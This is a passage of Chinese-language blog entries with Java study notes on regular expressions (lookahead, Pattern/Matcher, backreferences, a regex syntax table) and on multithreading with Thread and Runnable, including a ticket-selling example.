<h4 id="非捕获分组"><a href="#非捕获分组" class="headerlink" title="非捕获分组"></a>非捕获分组</h4><h5 id="pattern-1"><a href="#pattern-1" class="headerlink" title="(?:pattern)"></a>(?:pattern)</h5><p>非捕获分组不算入分组内,即不能通过group(i)去访问</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;124张三男士  hell张三先生   张三同学  &quot;</span>;</span><br><span class="line"><span class="comment">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span></span><br><span class="line">        String regStr=<span class="string">&quot;张三(?:男士|先生|同学)&quot;</span>;<span class="comment">//等价于:张三男士|张三先生|张三同学</span></span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        <span class="comment">//创建一个匹配器对象</span></span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;找到：&quot;</span> + matcher.group(<span class="number">0</span>)); <span class="comment">// 2000</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png"></p>
<h5 id="pattern-2"><a href="#pattern-2" class="headerlink" title="(?=pattern)"></a>(?=pattern)</h5><p>它是一个非捕获匹配,例如,”windows(?=95|98|NT|2000)”匹配”windows2000”中的”windows”,但不匹配”windows10”中的windows</p>
<p>(理解这个等号的含义即可)</p>
<h5 id="pattern-3"><a href="#pattern-3" class="headerlink" title="(?!pattern)"></a>(?!pattern)</h5><p>与上一个刚好相反,例如,”windows(?=95|98|NT|2000)”匹配”windows10”中的”windows”,但不匹配”windows2000”中的windows</p>
<p>(理解!与=的相反含义)</p>
<h4 id="匹配汉字"><a href="#匹配汉字" class="headerlink" title="匹配汉字"></a>匹配汉字</h4><p><code>resStr = &quot;^[\u0391-\uffe5]+$&quot;</code></p>
<p>上面的regStr匹配纯汉字</p>
<p>\u0391-\uffe5是汉字的编码范围</p>
<p>一些练习:</p>
<p>匹配1-9开头的六位数:  <code>^[1-9]\\d&#123;5&#125;$</code></p>
<p>匹配必须以13,14,15,18开头的11位数: <code>^1[3458]\\d&#123;9&#125;$</code></p>
<p>匹配小数或者整数 <code>^[-+]?([1-9]\\d*|0)(\\.\\d+)?$</code></p>
<h3 id="三个常用类"><a href="#三个常用类" class="headerlink" title="三个常用类"></a>三个常用类</h3><h4 id="Pattern类"><a href="#Pattern类" class="headerlink" title="Pattern类"></a>Pattern类</h4><p>Pattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Pattern p=Pattern.compile(regStr);</span><br></pre></td></tr></table></figure>

<h5 id="matches方法"><a href="#matches方法" class="headerlink" title="matches方法"></a>matches方法</h5><p>如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组</p>
<p><code>Pattern.matches(regStr,content)</code></p>
<h3 id="Matcher类"><a href="#Matcher类" class="headerlink" title="Matcher类"></a>Matcher类</h3><p>Matcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Matcher matcher= pattern.matcher(content);</span><br></pre></td></tr></table></figure>

<h5 id="matcher-start-获取find每一组开始的索引"><a href="#matcher-start-获取find每一组开始的索引" class="headerlink" title="matcher.start();获取find每一组开始的索引"></a>matcher.start();获取find每一组开始的索引</h5><h5 id="matcher-end-获取find每一组尾部的索引"><a href="#matcher-end-获取find每一组尾部的索引" class="headerlink" title="matcher.end();获取find每一组尾部的索引"></a>matcher.end();获取find每一组尾部的索引</h5><h5 id="replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent"><a href="#replaceAll-替换-注意该函数只是返回替换后的结果-并不修改原来conetent" class="headerlink" title="replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent"></a>replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class r1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String content=&quot;我确实是个傻缺&quot;;</span><br><span class="line">//      String regStr=&quot;^[0-9]+[a-z]+\\d+$&quot;;</span><br><span class="line">        String regStr=&quot;确实&quot;;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        //创建一个匹配器对象</span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        while (matcher.find()) &#123;</span><br><span class="line">            String newContent=matcher.replaceAll(&quot;雀氏&quot;);</span><br><span class="line">            System.out.println(newContent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="PatternSyntaxException类"><a href="#PatternSyntaxException类" class="headerlink" title="PatternSyntaxException类"></a>PatternSyntaxException类</h3><p>PatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误</p>
<h4 id="分组-捕获-反向引用"><a href="#分组-捕获-反向引用" class="headerlink" title="分组,捕获,反向引用"></a>分组,捕获,反向引用</h4><p>1.分组</p>
<p>我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)</p>
<p>2.捕获</p>
<p>把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容</p>
<p>3.<strong>反向引用</strong></p>
<p>圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用<code>\\分组号</code>,外部反向引用<code>$分组号</code></u></p>
<p>例子,匹配回文数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String regStr=<span class="string">&quot;(\\d)(\\d)\\2\\1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>—应用示例:</p>
<p>结巴程序:把 类似: “我….我要….学学学学….编程java!”   通过正则表达式修改为”我要学编程java!”</p>
<p>思路:</p>
<p>1.去掉所有的点</p>
<p>2.去除所有重复字</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;我....我要....学学学学....编程java!&quot;</span>;</span><br><span class="line">        <span class="comment">//1.去掉所有的点</span></span><br><span class="line">        String regStr=<span class="string">&quot;\\.&quot;</span>;</span><br><span class="line">        Pattern pattern=Pattern.compile(regStr);</span><br><span class="line">        Matcher matcher= pattern.matcher(content);</span><br><span class="line">        content=matcher.replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        System.out.println(content);</span><br><span class="line">        <span class="comment">//2去除所有重复字</span></span><br><span class="line">        regStr=<span class="string">&quot;(.)\\1+&quot;</span>;<span class="comment">//只会匹配到1-多的字符串</span></span><br><span class="line">        pattern=Pattern.compile(regStr);</span><br><span class="line">        matcher=pattern.matcher((content));</span><br><span class="line">        content=matcher.replaceAll(<span class="string">&quot;$1&quot;</span>);<span class="comment">//分组的表达式外引用</span></span><br><span class="line">        System.out.println(content);</span><br><span class="line">    	<span class="comment">//第2步的代码也可以用一行代码替换</span></span><br><span class="line">        <span class="comment">/*content=Pattern.compile(&quot;(.)\\1+&quot;).matcher(content).replaceAll(&quot;$1&quot;);</span></span><br><span class="line"><span class="comment">        System.out.println(content);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="String类中使用正则表达式"><a href="#String类中使用正则表达式" class="headerlink" title="String类中使用正则表达式"></a>String类中使用正则表达式</h4><p>String类中可以直接使用</p>
<ol>
<li><p>replaceAll()方法</p>
</li>
<li><p>matches()方法</p>
</li>
<li><p>分割功能    split()方法中可以使用正则表达式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">r1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String content=<span class="string">&quot;hello#abc-jack12smith~河南&quot;</span>;</span><br><span class="line">        <span class="comment">//要求按照#或-或~或数字来分割</span></span><br><span class="line">        String[]spilt = content.split(<span class="string">&quot;#|~|-|\\d+&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(String s : spilt)&#123;<span class="comment">//类似于foreach</span></span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png"></p>
</li>
</ol>
<h4 id="写正则表达式思路"><a href="#写正则表达式思路" class="headerlink" title="写正则表达式思路"></a>写正则表达式思路</h4><p>1.先写出一个简单的表达式,接着根据各种情况来逐渐完善</p>
<p>2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>java正则语法表</title>
    <url>/2021/12/09/java%E6%AD%A3%E5%88%99%E8%AF%AD%E6%B3%95%E8%A1%A8/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">\</td>
<td align="left">将下一字符标记为特殊字符、文本、反向引用或八进制转义符。例如， <strong>n</strong>匹配字符 <strong>n</strong>。<strong>\n</strong> 匹配换行符。序列 <strong>\\** 匹配 *<em>\*</em> ，</strong>\(** 匹配 **(**。</td>
</tr>
<tr>
<td align="left">^</td>
<td align="left">匹配输入字符串开始的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，^ 还会与”\n”或”\r”之后的位置匹配。</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配输入字符串结尾的位置。如果设置了 <strong>RegExp</strong> 对象的 <strong>Multiline</strong> 属性，$ 还会与”\n”或”\r”之前的位置匹配。</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">零次或多次匹配前面的字符或子表达式。例如，zo* 匹配”z”和”zoo”。* 等效于 {0,}。</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">一次或多次匹配前面的字符或子表达式。例如，”zo+”与”zo”和”zoo”匹配，但与”z”不匹配。+ 等效于 {1,}。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">零次或一次匹配前面的字符或子表达式。例如，”do(es)?”匹配”do”或”does”中的”do”。? 等效于 {0,1}。</td>
</tr>
<tr>
<td align="left">{<em>n</em>}</td>
<td align="left"><em>n</em> 是非负整数。正好匹配 <em>n</em> 次。例如，”o{2}”与”Bob”中的”o”不匹配，但与”food”中的两个”o”匹配。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,}</td>
<td align="left"><em>n</em> 是非负整数。至少匹配 <em>n</em> 次。例如，”o{2,}”不匹配”Bob”中的”o”，而匹配”foooood”中的所有 o。”o{1,}”等效于”o+”。”o{0,}”等效于”o*”。</td>
</tr>
<tr>
<td align="left">{<em>n</em>,<em>m</em>}</td>
<td align="left"><em>m</em> 和 <em>n</em> 是非负整数，其中 <em>n</em> &lt;= <em>m</em>。匹配至少 <em>n</em> 次，至多 <em>m</em> 次。例如，”o{1,3}”匹配”fooooood”中的头三个 o。’o{0,1}’ 等效于 ‘o?’。注意：您不能将空格插入逗号和数字之间。</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">当此字符紧随任何其他限定符（*、+、?、{<em>n</em>}、{<em>n</em>,}、{<em>n</em>,<em>m</em>}）之后时，匹配模式是”非贪心的”。”非贪心的”模式匹配搜索到的、尽可能短的字符串，而默认的”贪心的”模式匹配搜索到的、尽可能长的字符串。例如，在字符串”oooo”中，”o+?”只匹配单个”o”，而”o+”匹配所有”o”。</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配除”\r\n”之外的任何单个字符。若要匹配包括”\r\n”在内的任意字符，请使用诸如”[\s\S]”之类的模式。</td>
</tr>
<tr>
<td align="left">(<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 并捕获该匹配的子表达式。可以使用 <strong>$0…$9</strong> 属性从结果”匹配”集合中检索捕获的匹配。若要匹配括号字符 ( )，请使用”(“或者”)“。</td>
</tr>
<tr>
<td align="left">(?:<em>pattern</em>)</td>
<td align="left">匹配 <em>pattern</em> 但不捕获该匹配的子表达式，即它是一个非捕获匹配，不存储供以后使用的匹配。这对于用”or”字符 (|) 组合模式部件的情况很有用。例如，’industr(?:y|ies) 是比 ‘industry|industries’ 更经济的表达式。</td>
</tr>
<tr>
<td align="left">(?=<em>pattern</em>)</td>
<td align="left">执行正向预测先行搜索的子表达式，该表达式匹配处于匹配 <em>pattern</em> 的字符串的起始点的字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?=95|98|NT|2000)’ 匹配”Windows 2000”中的”Windows”，但不匹配”Windows 3.1”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left">(?!<em>pattern</em>)</td>
<td align="left">执行反向预测先行搜索的子表达式，该表达式匹配不处于匹配 <em>pattern</em> 的字符串的起始点的搜索字符串。它是一个非捕获匹配，即不能捕获供以后使用的匹配。例如，’Windows (?!95|98|NT|2000)’ 匹配”Windows 3.1”中的 “Windows”，但不匹配”Windows 2000”中的”Windows”。预测先行不占用字符，即发生匹配后，下一匹配的搜索紧随上一匹配之后，而不是在组成预测先行的字符后。</td>
</tr>
<tr>
<td align="left"><em>x</em>|<em>y</em></td>
<td align="left">匹配 <em>x</em> 或 <em>y</em>。例如，’z|food’ 匹配”z”或”food”。’(z|f)ood’ 匹配”zood”或”food”。</td>
</tr>
<tr>
<td align="left">[<em>xyz</em>]</td>
<td align="left">字符集。匹配包含的任一字符。例如，”[abc]”匹配”plain”中的”a”。</td>
</tr>
<tr>
<td align="left">[^<em>xyz</em>]</td>
<td align="left">反向字符集。匹配未包含的任何字符。例如，”[^abc]”匹配”plain”中”p”，”l”，”i”，”n”。</td>
</tr>
<tr>
<td align="left">[<em>a-z</em>]</td>
<td align="left">字符范围。匹配指定范围内的任何字符。例如，”[a-z]”匹配”a”到”z”范围内的任何小写字母。</td>
</tr>
<tr>
<td align="left">[^<em>a-z</em>]</td>
<td align="left">反向范围字符。匹配不在指定的范围内的任何字符。例如，”[^a-z]”匹配任何不在”a”到”z”范围内的任何字符。</td>
</tr>
<tr>
<td align="left">\b</td>
<td align="left">匹配一个字边界，即字与空格间的位置。例如，”er\b”匹配”never”中的”er”，但不匹配”verb”中的”er”。</td>
</tr>
<tr>
<td align="left">\B</td>
<td align="left">非字边界匹配。”er\B”匹配”verb”中的”er”，但不匹配”never”中的”er”。</td>
</tr>
<tr>
<td align="left">\c<em>x</em></td>
<td align="left">匹配 <em>x</em> 指示的控制字符。例如，\cM 匹配 Control-M 或回车符。<em>x</em> 的值必须在 A-Z 或 a-z 之间。如果不是这样，则假定 c 就是”c”字符本身。</td>
</tr>
<tr>
<td align="left">\d</td>
<td align="left">数字字符匹配。等效于 [0-9]。</td>
</tr>
<tr>
<td align="left">\D</td>
<td align="left">非数字字符匹配。等效于 [^0-9]。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">换页符匹配。等效于 \x0c 和 \cL。</td>
</tr>
<tr>
<td align="left">\n</td>
<td align="left">换行符匹配。等效于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">匹配一个回车符。等效于 \x0d 和 \cM。</td>
</tr>
<tr>
<td align="left">\s</td>
<td align="left">匹配任何空白字符，包括空格、制表符、换页符等。与 [ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\S</td>
<td align="left">匹配任何非空白字符。与 [^ \f\n\r\t\v] 等效。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">制表符匹配。与 \x09 和 \cI 等效。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">垂直制表符匹配。与 \x0b 和 \cK 等效。</td>
</tr>
<tr>
<td align="left">\w</td>
<td align="left">匹配任何字类字符，包括下划线。与”[A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\W</td>
<td align="left">与任何非单词字符匹配。与”[^A-Za-z0-9_]”等效。</td>
</tr>
<tr>
<td align="left">\x<em>n</em></td>
<td align="left">匹配 <em>n</em>，此处的 <em>n</em> 是一个十六进制转义码。十六进制转义码必须正好是两位数长。例如，”\x41”匹配”A”。”\x041”与”\x04”&amp;”1”等效。允许在正则表达式中使用 ASCII 代码。</td>
</tr>
<tr>
<td align="left">*num*</td>
<td align="left">匹配 <em>num</em>，此处的 <em>num</em> 是一个正整数。到捕获匹配的反向引用。例如，”(.)\1”匹配两个连续的相同字符。</td>
</tr>
<tr>
<td align="left">*n*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *n* 前面至少有 <em>n</em> 个捕获子表达式，那么 <em>n</em> 是反向引用。否则，如果 <em>n</em> 是八进制数 (0-7)，那么 <em>n</em> 是八进制转义码。</td>
</tr>
<tr>
<td align="left">*nm*</td>
<td align="left">标识一个八进制转义码或反向引用。如果 *nm* 前面至少有 <em>nm</em> 个捕获子表达式，那么 <em>nm</em> 是反向引用。如果 *nm* 前面至少有 <em>n</em> 个捕获，则 <em>n</em> 是反向引用，后面跟有字符 <em>m</em>。如果两种前面的情况都不存在，则 *nm* 匹配八进制值 <em>nm</em>，其中 <em>n</em> 和 <em>m</em> 是八进制数字 (0-7)。</td>
</tr>
<tr>
<td align="left">\nml</td>
<td align="left">当 <em>n</em> 是八进制数 (0-3)，<em>m</em> 和 <em>l</em> 是八进制数 (0-7) 时，匹配八进制转义码 <em>nml</em>。</td>
</tr>
<tr>
<td align="left">\u<em>n</em></td>
<td align="left">匹配 <em>n</em>，其中 <em>n</em> 是以四位十六进制数表示的 Unicode 字符。例如，\u00A9 匹配版权符号 (©)。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>java多线程</title>
    <url>/2021/12/23/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<h4 id="多线程相关概念"><a href="#多线程相关概念" class="headerlink" title="多线程相关概念"></a>多线程相关概念</h4><p>并发:同一个时刻,多个任务交替执行,造成一种貌似同时的错觉,简单的说,单核CPU实现的多任务就是并发</p>
<p>并行:同一个时刻,多个任务同时执行,多核CPU可以实现并行</p>
<h4 id="两种实现多线程方式的对比分析"><a href="#两种实现多线程方式的对比分析" class="headerlink" title="两种实现多线程方式的对比分析"></a>两种实现多线程方式的对比分析</h4><p>直接继承Thread类和实现Runnable接口都能实现多线程,具体有什么区别呢</p>
<p>1.从java的设计来看,通过继承Thread或者实现Runnable接口来创建线程本质上都没有区别,Thread类本身就实现了Runnable接口</p>
<p>2.实现Runnable接口方式更加适合多个线程共享一个资源的情况,并且避免了单继承的限制</p>
<h4 id="直接继承Thread"><a href="#直接继承Thread" class="headerlink" title="直接继承Thread"></a>直接继承Thread</h4><p>通过两段代码来对比一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">        <span class="keyword">new</span> TicketWindow().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//重写run方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取当前线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223233326400.png" alt="image-20211223233326400"></p>
<p>由运行结果可知,当前每个线程处于”各卖各的票”的情况,对tickies没有实现共享</p>
<h5 id="为什么不调用run方法而调用start方法"><a href="#为什么不调用run方法而调用start方法" class="headerlink" title="为什么不调用run方法而调用start方法?"></a>为什么不调用run方法而调用start方法?</h5><p>因为run方法就只是一个普通的方法,没有真正的启动一个线程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">    start0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>;</span><br><span class="line"><span class="comment">//start0()是本地方法(native),是JVM调用,底层是c/c++实现</span></span><br><span class="line"><span class="comment">//真正实现多线程的效果,是start0()方法</span></span><br></pre></td></tr></table></figure>

<p><strong>start()方法调用start0()方法后,该线程并不一定会立刻执行,只是将线程变成了可运行状态,具体什么时候执行,取决于cpu,由cpu统一调度</strong></p>
<h4 id="实现Runnable接口"><a href="#实现Runnable接口" class="headerlink" title="实现Runnable接口"></a>实现Runnable接口</h4><h5 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h5><p><span id="example">例子</span></p>
<p>该方法底层使用了一个设计模式<strong>线程代理模式</strong>,接下来用代码进行模拟,代码和真正有差别,但是原理一样</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">proxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Tiger tiger=<span class="keyword">new</span> Tiger();<span class="comment">//Tiger类实现了Runnable接口</span></span><br><span class="line">        ThreadProxy threadProxy = <span class="keyword">new</span> ThreadProxy(tiger);<span class="comment">//为什么能把tiger放进去,因为tiger实现了Runnable</span></span><br><span class="line">        threadProxy.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span> <span class="keyword">extends</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老虎嗷嗷叫&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadProxy</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Runnable target =<span class="keyword">null</span>;<span class="comment">//类型是Runnable的属性</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(target!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            target.run();<span class="comment">//动态绑定,最后调用的还是tiger的run</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadProxy</span><span class="params">(Runnable target)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target=target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        start0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start0</span><span class="params">()</span></span>&#123;</span><br><span class="line">        run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">总的来说就是,Tiger没有start方法,但是通过实现Runnable接口,就可以通过Runnable做中间代理从而使用Runnable中的start方法来调用Tiger的run方法实现线程的启动</span><br></pre></td></tr></table></figure>

<p>在通常的开发当中，一般会选择实现Runnable接口，原因有二：<br>1、避免单继承的局限，在Java当中一个类可以实现多个接口，但只能继承一个类<br>2、适合资源的共享</p>
<p>缺点:编程多一层对象包装,如果线程有执行结果是不可以直接返回的</p>
<p><span id="sell">售票程序</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S8_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">         TicketWindow tw=<span class="keyword">new</span> TicketWindow();<span class="comment">//创建TicketWindow的实例对象tw</span></span><br><span class="line">        <span class="comment">//这几个线程其实都在执行tw这个对象</span></span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口1&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口2&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口3&quot;</span>).start();</span><br><span class="line">         <span class="keyword">new</span> Thread(tw,<span class="string">&quot;窗口4&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TicketWindow</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> tickies=<span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tickies&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                Thread th= Thread.currentThread();<span class="comment">//获取当前线程</span></span><br><span class="line">                String th_name=th.getName();<span class="comment">//获取线程名称</span></span><br><span class="line">                System.out.println(th_name+<span class="string">&quot;正在发售&quot;</span>+tickies--+<span class="string">&quot;张票&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//可能会出现超卖的现象</span></span><br></pre></td></tr></table></figure>

<img src="/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png" alt="image-20211223234915498" style="zoom:67%;" />

<p>这样就不会出现重复卖票的情况,实现了tickies的共享</p>
<p>Runnable接口还可以通过匿名对象来实现</p>
